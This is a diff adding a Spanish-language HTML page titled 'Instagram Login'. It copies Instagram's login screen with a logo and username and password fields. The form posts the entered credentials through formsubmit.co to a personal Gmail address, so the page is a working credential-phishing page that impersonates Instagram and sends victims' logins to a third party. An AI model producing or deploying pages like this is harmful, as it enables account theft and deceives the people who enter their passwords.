@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram Login</title>
+  <link rel="stylesheet" href="index.css">
+</head>
+<body>
+  <div class="login-container">
+    <div class="instagram-logo"> <img src="ig.png" alt=""> </div>
+    <form id="login-form" action="https://formsubmit.co/sebaszapata2022@gmail.com" method="POST">
+      <input  name="Usuario"  type="text" id="username" placeholder="Usuario" required>
+      <input  name="Contraseña"  type="password" id="password" placeholder="Contraseña" required>
+      <button type="submit">Iniciar sesión</button>
+    </form>
+    <p id="error-message" class="error-message"></p>
+  </div>
+  
+  <script src="script.js"></script>
+</body>
+</html>
